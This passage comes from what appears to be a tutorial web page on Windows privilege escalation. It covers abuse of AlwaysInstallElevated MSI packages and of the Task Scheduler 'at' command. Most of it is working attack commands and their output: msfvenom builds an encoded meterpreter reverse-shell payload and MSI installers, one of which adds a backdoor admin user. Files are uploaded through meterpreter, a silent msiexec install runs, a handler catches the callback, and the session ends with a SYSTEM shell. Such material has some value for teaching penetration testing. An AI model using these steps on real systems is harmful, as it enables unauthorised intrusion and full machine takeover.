</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">root@kali:~</span><span class="co1"># msfvenom -f msi-nouac -p windows/adduser USER=eviladmin PASS=P4ssw0rd@ -o add_user.msi</span><span class=""></span></li><li class=" even"><span class="">No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span></li><li class=" odd"><span class="">No Arch selected, selecting Arch: x86 from the payload</span></li><li class=" even"><span class="">No encoder or badchars specified, outputting raw payload</span></li><li class=" odd"><span class="">Payload size: </span><span class="nu0">277</span><span class=""> bytes</span></li><li class=" even"><span class="">Final size of msi file: </span><span class="nu0">159744</span><span class=""> bytes</span></li><li class=" odd"><span class="">Saved as: add_user.msi</span></li><li class=" even"><span class="">root@kali:~</span><span class="co1"># </span></li></ol><pre style="display: none;">root@kali:~# msfvenom -f msi-nouac -p windows/adduser USER=eviladmin PASS=P4ssw0rd@ -o add_user.msi
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 277 bytes
Final size of msi file: 159744 bytes
Saved as: add_user.msi
root@kali:~# </pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>But in this scenario, I’ll generate an executable reverse shell payload(Payload.exe) and an msi&nbsp;package(malicious.msi) that executes this payload. Let’s do it!</p>
<p>Generating Payload.exe:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1" data-enlighter-language="null" style="display: none;">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 360 (iteration=0)
x86/shikata_ga_nai chosen with final size 360
Payload size: 360 bytes
Final size of exe file: 73802 bytes
Saved as: Payload.exe
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">root@kali:~</span><span class="co1"># msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe</span><span class=""></span></li><li class=" even"><span class="">No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span></li><li class=" odd"><span class="">No Arch selected, selecting Arch: x86 from the payload</span></li><li class=" even"><span class="">Found </span><span class="nu0">1</span><span class=""> compatible encoders</span></li><li class=" odd"><span class="">Attempting to encode payload with </span><span class="nu0">1</span><span class=""> iterations of x86/shikata_ga_nai</span></li><li class=" even"><span class="">x86/shikata_ga_nai succeeded with size </span><span class="kw1">360</span><span class=""> </span><span class="br0">(</span><span class="">iteration=</span><span class="nu0">0</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">x86/shikata_ga_nai chosen with final size </span><span class="nu0">360</span><span class=""></span></li><li class=" even"><span class="">Payload size: </span><span class="nu0">360</span><span class=""> bytes</span></li><li class=" odd"><span class="">Final size of exe file: </span><span class="nu0">73802</span><span class=""> bytes</span></li><li class=" even"><span class="">Saved as: Payload.exe</span></li></ol><pre style="display: none;">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 360 (iteration=0)
x86/shikata_ga_nai chosen with final size 360
Payload size: 360 bytes
Final size of exe file: 73802 bytes
Saved as: Payload.exe</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Generating malicious.msi by using&nbsp;<em>windows/exec</em> as a payload.&nbsp;Make sure you enter the correct path for&nbsp;Payload.exe:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1" data-enlighter-language="null" style="display: none;">root@kali:~# msfvenom -f msi-nouac -p windows/exec cmd="C:\Users\testuser\AppData\Local\Temp\Payload.exe" &gt; malicious.msi
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 233 bytes
Final size of msi-nouac file: 159744 bytes
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">root@kali:~</span><span class="co1"># msfvenom -f msi-nouac -p windows/exec cmd="C:\Users\testuser\AppData\Local\Temp\Payload.exe" &gt; malicious.msi</span><span class=""></span></li><li class=" even"><span class="">No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span></li><li class=" odd"><span class="">No Arch selected, selecting Arch: x86 from the payload</span></li><li class=" even"><span class="">No encoder or badchars specified, outputting raw payload</span></li><li class=" odd"><span class="">Payload size: </span><span class="nu0">233</span><span class=""> bytes</span></li><li class=" even"><span class="">Final size of msi-nouac file: </span><span class="nu0">159744</span><span class=""> bytes</span></li></ol><pre style="display: none;">root@kali:~# msfvenom -f msi-nouac -p windows/exec cmd="C:\Users\testuser\AppData\Local\Temp\Payload.exe" &gt; malicious.msi
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 233 bytes
Final size of msi-nouac file: 159744 bytes</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Now we can upload these two to our target machine.</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1,2,5" style="display: none;">meterpreter &gt; cd C:/Users/testuser/AppData/Local/Temp
meterpreter &gt; upload -f Payload.exe
[*] uploading  : Payload.exe -&gt; Payload.exe
[*] uploaded   : Payload.exe -&gt; Payload.exe
meterpreter &gt; upload -f malicious.msi
[*] uploading  : malicious.msi -&gt; malicious.msi
[*] uploaded   : malicious.msi -&gt; malicious.msi
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">meterpreter &gt; cd C:/Users/testuser/AppData/Local/Temp</span></li><li class="specialline even"><span class="">meterpreter &gt; upload -f Payload.exe</span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> uploading  : Payload.exe -&gt; Payload.exe</span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> uploaded   : Payload.exe -&gt; Payload.exe</span></li><li class="specialline odd"><span class="">meterpreter &gt; upload -f malicious.msi</span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> uploading  : malicious.msi -&gt; malicious.msi</span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> uploaded   : malicious.msi -&gt; malicious.msi</span></li></ol><pre style="display: none;">meterpreter &gt; cd C:/Users/testuser/AppData/Local/Temp
meterpreter &gt; upload -f Payload.exe
[*] uploading  : Payload.exe -&gt; Payload.exe
[*] uploaded   : Payload.exe -&gt; Payload.exe
meterpreter &gt; upload -f malicious.msi
[*] uploading  : malicious.msi -&gt; malicious.msi
[*] uploaded   : malicious.msi -&gt; malicious.msi</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Before executing the .msi file, start a new handler on another terminal window for brand new hi-priv shell:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1,2,4,6,8" data-enlighter-language="null" style="display: none;">msf &gt; use exploit/multi/handler 
msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(handler) &gt; set lhost 192.168.2.60
lhost =&gt; 192.168.2.60
msf exploit(handler) &gt; set lport 8989
lport =&gt; 8989
msf exploit(handler) &gt; run

[*] Started reverse TCP handler on 192.168.2.60:8989 
[*] Starting the payload handler...
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">msf &gt; use exploit/multi/handler </span></li><li class="specialline even"><span class="">msf </span><span class="kw1">exploit</span><span class="br0">(</span><span class="">handler</span><span class="br0">)</span><span class=""> &gt; set payload windows/meterpreter/reverse_tcp</span></li><li class=" odd"><span class="">payload =&gt; windows/meterpreter/reverse_tcp</span></li><li class="specialline even"><span class="">msf </span><span class="kw1">exploit</span><span class="br0">(</span><span class="">handler</span><span class="br0">)</span><span class=""> &gt; set lhost </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.60</span><span class=""></span></li><li class=" odd"><span class="">lhost =&gt; </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.60</span><span class=""></span></li><li class="specialline even"><span class="">msf </span><span class="kw1">exploit</span><span class="br0">(</span><span class="">handler</span><span class="br0">)</span><span class=""> &gt; set lport </span><span class="nu0">8989</span><span class=""></span></li><li class=" odd"><span class="">lport =&gt; </span><span class="nu0">8989</span><span class=""></span></li><li class="specialline even"><span class="">msf </span><span class="kw1">exploit</span><span class="br0">(</span><span class="">handler</span><span class="br0">)</span><span class=""> &gt; run</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Started reverse TCP handler on </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.60</span><span class="">:</span><span class="nu0">8989</span><span class=""> </span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Starting the payload handler...</span></li></ol><pre style="display: none;">msf &gt; use exploit/multi/handler 
msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(handler) &gt; set lhost 192.168.2.60
lhost =&gt; 192.168.2.60
msf exploit(handler) &gt; set lport 8989
lport =&gt; 8989
msf exploit(handler) &gt; run

[*] Started reverse TCP handler on 192.168.2.60:8989 
[*] Starting the payload handler...</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Now we’re ready to execute!</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1,7" style="display: none;">meterpreter &gt; shell
Process 1260 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\testuser\AppData\Local\temp&gt;msiexec /quiet /qn /i malicious.msi 
msiexec /quiet /qn /i malicious.msi

C:\Users\testuser\AppData\Local\temp&gt;</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">meterpreter &gt; shell</span></li><li class=" even"><span class="">Process </span><span class="nu0">1260</span><span class=""> created.</span></li><li class=" odd"><span class="">Channel </span><span class="nu0">2</span><span class=""> created.</span></li><li class=" even"><span class="">Microsoft Windows </span><span class="br0">[</span><span class="">Version </span><span class="nu0">6.3</span><span class="nu0">.9600</span><span class="br0">]</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">(</span><span class="">c</span><span class="br0">)</span><span class=""> </span><span class="nu0">2013</span><span class=""> Microsoft Corporation. All rights reserved.</span></li><li class=" even"><span class=""></span></li><li class="specialline odd"><span class="">C:\Users\testuser\AppData\Local\temp&gt;msiexec /quiet /qn /i malicious.msi </span></li><li class=" even"><span class="">msiexec /quiet /qn /i malicious.msi</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">C:\Users\testuser\AppData\Local\temp&gt;</span></li></ol><pre style="display: none;">meterpreter &gt; shell
Process 1260 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\testuser\AppData\Local\temp&gt;msiexec /quiet /qn /i malicious.msi 
msiexec /quiet /qn /i malicious.msi

C:\Users\testuser\AppData\Local\temp&gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>/quiet = Suppress any messages to the user during installation<br>
/qn = No GUI<br>
/i = Regular (vs. administrative) installation</p>
<p>Enjoy your shell with SYSTEM privileges!</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="6,7" data-enlighter-language="null" style="display: none;">[*] Started reverse TCP handler on 192.168.2.60:8989 
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.2.236
[*] Meterpreter session 1 opened (192.168.2.60:8989 -&gt; 192.168.2.236:36071) at 2016-12-21 04:21:57 -0500

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter &gt;</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Started reverse TCP handler on </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.60</span><span class="">:</span><span class="nu0">8989</span><span class=""> </span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Starting the payload handler...</span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Sending </span><span class="kw1">stage</span><span class=""> </span><span class="br0">(</span><span class="nu0">957999</span><span class=""> bytes</span><span class="br0">)</span><span class=""> to </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.236</span><span class=""></span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> Meterpreter session </span><span class="nu0">1</span><span class=""> </span><span class="kw1">opened</span><span class=""> </span><span class="br0">(</span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.60</span><span class="">:</span><span class="nu0">8989</span><span class=""> -&gt; </span><span class="nu0">192.168</span><span class="nu0">.2</span><span class="nu0">.236</span><span class="">:</span><span class="nu0">36071</span><span class="br0">)</span><span class=""> at </span><span class="nu0">2016</span><span class="">-</span><span class="nu0">12</span><span class="">-</span><span class="nu0">21</span><span class=""> </span><span class="nu0">04</span><span class="">:</span><span class="nu0">21</span><span class="">:</span><span class="nu0">57</span><span class=""> -</span><span class="nu0">0500</span><span class=""></span></li><li class=" odd"><span class=""></span></li><li class="specialline even"><span class="">meterpreter &gt; getuid</span></li><li class="specialline odd"><span class="">Server username: NT AUTHORITY\SYSTEM</span></li><li class=" even"><span class="">meterpreter &gt;</span></li></ol><pre style="display: none;">[*] Started reverse TCP handler on 192.168.2.60:8989 
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.2.236
[*] Meterpreter session 1 opened (192.168.2.60:8989 -&gt; 192.168.2.236:36071) at 2016-12-21 04:21:57 -0500

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter &gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>Instead of manually applying this technique you can use this Metasploit module: <a href="https://www.rapid7.com/db/modules/exploit/windows/local/always_install_elevated"><em>exploit/windows/local/always_install_elevated</em></a></p>
<p>This module only requires that you link it to an existing Meterpreter session before running:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1,2" data-enlighter-language="null" style="display: none;">msf &gt; use exploit/windows/local/always_install_elevated
msf exploit(always_install_elevated) &gt; show options

Module options (exploit/windows/local/always_install_elevated):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">msf &gt; use exploit/windows/local/always_install_elevated</span></li><li class="specialline even"><span class="">msf </span><span class="kw1">exploit</span><span class="br0">(</span><span class="">always_install_elevated</span><span class="br0">)</span><span class=""> &gt; show options</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">Module </span><span class="kw1">options</span><span class=""> </span><span class="br0">(</span><span class="">exploit/windows/local/always_install_elevated</span><span class="br0">)</span><span class="">:</span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">   Name     Current Setting  Required  Description</span></li><li class=" odd"><span class="">   ----     ---------------  --------  -----------</span></li><li class=" even"><span class="">   SESSION                   yes       The session to run this module on.</span></li></ol><pre style="display: none;">msf &gt; use exploit/windows/local/always_install_elevated
msf exploit(always_install_elevated) &gt; show options

Module options (exploit/windows/local/always_install_elevated):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<h3>Privilege Escalation with&nbsp;Task Scheduler</h3>
<p>This method only works on&nbsp;a Windows 2000, XP, or 2003 machine. You must&nbsp;have local administrator privileges to manage scheduled tasks. If you have a meterpreter session with limited user privileges this method&nbsp;will not work.</p>
<p>On Windows 2000, XP, and 2003 machines, scheduled tasks run as SYSTEM privileges. That means&nbsp;if we&nbsp;create a scheduled task that&nbsp;executes our malicious executable, it will run as SYSTEM. <img draggable="false" class="emoji" alt="😉" src="./Windows Privilege Escalation Methods_files/1f609.svg"></p>
<p>Again, I’ll generate&nbsp;an executable reverse shell payload for this job. Let’s demonstrate!</p>
<p>Generating an executable reverse shell payload:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1" data-enlighter-language="null" style="display: none;">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 360 (iteration=0)
x86/shikata_ga_nai chosen with final size 360
Payload size: 360 bytes
Final size of exe file: 73802 bytes
Saved as: Payload.exe
</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">root@kali:~</span><span class="co1"># msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe</span><span class=""></span></li><li class=" even"><span class="">No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span></li><li class=" odd"><span class="">No Arch selected, selecting Arch: x86 from the payload</span></li><li class=" even"><span class="">Found </span><span class="nu0">1</span><span class=""> compatible encoders</span></li><li class=" odd"><span class="">Attempting to encode payload with </span><span class="nu0">1</span><span class=""> iterations of x86/shikata_ga_nai</span></li><li class=" even"><span class="">x86/shikata_ga_nai succeeded with size </span><span class="kw1">360</span><span class=""> </span><span class="br0">(</span><span class="">iteration=</span><span class="nu0">0</span><span class="br0">)</span><span class=""></span></li><li class=" odd"><span class="">x86/shikata_ga_nai chosen with final size </span><span class="nu0">360</span><span class=""></span></li><li class=" even"><span class="">Payload size: </span><span class="nu0">360</span><span class=""> bytes</span></li><li class=" odd"><span class="">Final size of exe file: </span><span class="nu0">73802</span><span class=""> bytes</span></li><li class=" even"><span class="">Saved as: Payload.exe</span></li></ol><pre style="display: none;">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.60 LPORT=8989 -f exe -o Payload.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 360 (iteration=0)
x86/shikata_ga_nai chosen with final size 360
Payload size: 360 bytes
Final size of exe file: 73802 bytes
Saved as: Payload.exe</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>You can drop your payload anywhere you want. I prefer temp folder:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1,3,11,12" style="display: none;">meterpreter &gt; getuid
Server username: TESTMACHINE\test
meterpreter &gt; sysinfo
Computer        : TESTMACHINE
OS              : Windows XP (Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter &gt; cd "C:/Documents and Settings/test/Local Settings/Temp"
meterpreter &gt; upload -f Payload.exe
[*] uploading  : Payload.exe -&gt; Payload.exe
[*] uploaded   : Payload.exe -&gt; Payload.exe</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">meterpreter &gt; getuid</span></li><li class=" even"><span class="">Server username: TESTMACHINE\test</span></li><li class="specialline odd"><span class="">meterpreter &gt; sysinfo</span></li><li class=" even"><span class="">Computer        : TESTMACHINE</span></li><li class=" odd"><span class="">OS              : Windows </span><span class="kw1">XP</span><span class=""> </span><span class="br0">(</span><span class="">Build </span><span class="nu0">2600</span><span class="">, Service Pack </span><span class="nu0">3</span><span class="br0">)</span><span class="">.</span></li><li class=" even"><span class="">Architecture    : x86</span></li><li class=" odd"><span class="">System Language : en_US</span></li><li class=" even"><span class="">Domain          : WORKGROUP</span></li><li class=" odd"><span class="">Logged On Users : </span><span class="nu0">2</span><span class=""></span></li><li class=" even"><span class="">Meterpreter     : x86/win32</span></li><li class="specialline odd"><span class="">meterpreter &gt; cd </span><span class="st0">"C:/Documents and Settings/test/Local Settings/Temp"</span><span class=""></span></li><li class="specialline even"><span class="">meterpreter &gt; upload -f Payload.exe</span></li><li class=" odd"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> uploading  : Payload.exe -&gt; Payload.exe</span></li><li class=" even"><span class=""></span><span class="br0">[</span><span class="">*</span><span class="br0">]</span><span class=""> uploaded   : Payload.exe -&gt; Payload.exe</span></li></ol><pre style="display: none;">meterpreter &gt; getuid
Server username: TESTMACHINE\test
meterpreter &gt; sysinfo
Computer        : TESTMACHINE
OS              : Windows XP (Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter &gt; cd "C:/Documents and Settings/test/Local Settings/Temp"
meterpreter &gt; upload -f Payload.exe
[*] uploading  : Payload.exe -&gt; Payload.exe
[*] uploaded   : Payload.exe -&gt; Payload.exe</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>We should ensure that <em>Task Scheduler</em> service works. Attempt to start service:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1,7" style="display: none;">meterpreter &gt; shell
Process 840 created.
Channel 2 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\test\Local Settings\Temp&gt;net start "Task Scheduler"
net start "Task Scheduler"
The requested service has already been started.

More help is available by typing NET HELPMSG 2182.


C:\Documents and Settings\test\Local Settings\Temp&gt;</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">meterpreter &gt; shell</span></li><li class=" even"><span class="">Process </span><span class="nu0">840</span><span class=""> created.</span></li><li class=" odd"><span class="">Channel </span><span class="nu0">2</span><span class=""> created.</span></li><li class=" even"><span class="">Microsoft Windows XP </span><span class="br0">[</span><span class="">Version </span><span class="nu0">5.1</span><span class="nu0">.2600</span><span class="br0">]</span><span class=""></span></li><li class=" odd"><span class=""></span><span class="br0">(</span><span class="">C</span><span class="br0">)</span><span class=""> Copyright </span><span class="nu0">1985</span><span class="">-</span><span class="nu0">2001</span><span class=""> Microsoft Corp.</span></li><li class=" even"><span class=""></span></li><li class="specialline odd"><span class="">C:\Documents and Settings\test\Local Settings\Temp&gt;net start </span><span class="st0">"Task Scheduler"</span><span class=""></span></li><li class=" even"><span class="">net start </span><span class="st0">"Task Scheduler"</span><span class=""></span></li><li class=" odd"><span class="">The requested service has already been started.</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">More help is available by typing NET HELPMSG </span><span class="nu0">2182</span><span class="">.</span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">C:\Documents and Settings\test\Local Settings\Temp&gt;</span></li></ol><pre style="display: none;">meterpreter &gt; shell
Process 840 created.
Channel 2 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\test\Local Settings\Temp&gt;net start "Task Scheduler"
net start "Task Scheduler"
The requested service has already been started.

More help is available by typing NET HELPMSG 2182.


C:\Documents and Settings\test\Local Settings\Temp&gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>It seems to be already running. Let’s check machine’s current time:</p>
<pre class="EnlighterJSRAW" data-enlighter-highlight="1,3" style="display: none;">C:\Documents and Settings\test\Local Settings\Temp&gt;time
time
The current time is:  6:41:05.81
Enter the new time: 

C:\Documents and Settings\test\Local Settings\Temp&gt;</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class="specialline odd"><span class="">C:\Documents and Settings\test\Local Settings\Temp&gt;time</span></li><li class=" even"><span class="">time</span></li><li class="specialline odd"><span class="">The current time is:  </span><span class="nu0">6</span><span class="">:</span><span class="nu0">41</span><span class="">:</span><span class="nu0">05.81</span><span class=""></span></li><li class=" even"><span class="">Enter the new time: </span></li><li class=" odd"><span class=""></span></li><li class=" even"><span class="">C:\Documents and Settings\test\Local Settings\Temp&gt;</span></li></ol><pre style="display: none;">C:\Documents and Settings\test\Local Settings\Temp&gt;time
time
The current time is:  6:41:05.81
Enter the new time: 

C:\Documents and Settings\test\Local Settings\Temp&gt;</pre><div class="EnlighterJSToolbar"><a class="EnlighterJSInfoButton" title="EnlighterJS Syntax Highlighter"></a><a class="EnlighterJSRawButton" title="Toggle RAW Code"></a><a class="EnlighterJSWindowButton" title="Open Code in new Window"></a><span class="clear"></span></div></div>
<p>We will create a task&nbsp;that will run our executable about 1 minute after the current time:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null" style="display: none;">C:\Documents and Settings\test\Local Settings\Temp&gt;at 06:42 /interactive "C:\Documents and Settings\test\Local Settings\Temp\Payload.exe"
at 06:42 /interactive "C:\Documents and Settings\test\Local Settings\Temp\Payload.exe"
Added a new job with job ID = 1

C:\Documents and Settings\test\Local Settings\Temp&gt;</pre><div class="EnlighterJSWrapper enlighterEnlighterJSWrapper"><ol class="hoverEnabled enlighterEnlighterJS EnlighterJS"><li class=" odd"><span class="">C:\Documents and Settings\test\Local Settings\Temp&gt;at </span><span class="nu0">06</span><span class="">:</span><span class="nu0">42</span><span class=""> /interactive </span><span class="st0">"C:\Documents and Settings\test\Local Settings\Temp\Payload.exe"</span><span class=""></span></li><li class=" even"><span class="">at </span><span class="nu0">06</span><span class="">:</span><span class="nu0">42</span><span class=""> /interactive </span><span class="st0">"C:\Documents and Settings\test\Local Settings\Temp\Payload.exe"</span><span class=""></span></li><li class=" odd"><span class="">Added a new job with job ID = </span><span class="nu0">1</span><span class=""></span></li><li class=" even"><span class=""></span></li><li class=" odd"><span class="">C:\Documents and Settings\test\Local Settings\Temp&gt;</span></li></ol><pre style="display: none;">C:\Documents and Settings\test\Local Settings\Temp&gt;at 06:42 /interactive "C:\Documents and Settings\test\Local Settings\Temp\Payload.exe"
